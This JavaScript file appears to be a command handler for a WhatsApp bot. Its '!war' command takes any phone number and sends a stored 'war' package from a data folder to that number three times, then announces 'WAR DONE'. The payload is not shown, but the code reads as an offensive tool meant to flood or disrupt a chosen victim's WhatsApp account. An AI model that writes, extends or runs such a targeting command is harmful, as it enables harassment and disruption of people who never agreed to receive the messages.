import { sendPackage }
from "../lib/package.js";

export default async function war(
sock,
from,
args,
m
){

const num = args[0];

if(!num){

return sock.sendMessage(from,{
text:"📌 example:\n!war 9379xxxx"
});

}

const jid =
num.replace(/\D/g,"")
+ "@s.whatsapp.net";

await sock.sendMessage(from,{
react:{
text:"🔥",
key:m.key
}
});

await sendPackage(
sock,
jid,
"./data/war",
3
);

await sock.sendMessage(from,{
text:"🔥 WAR DONE"
});

}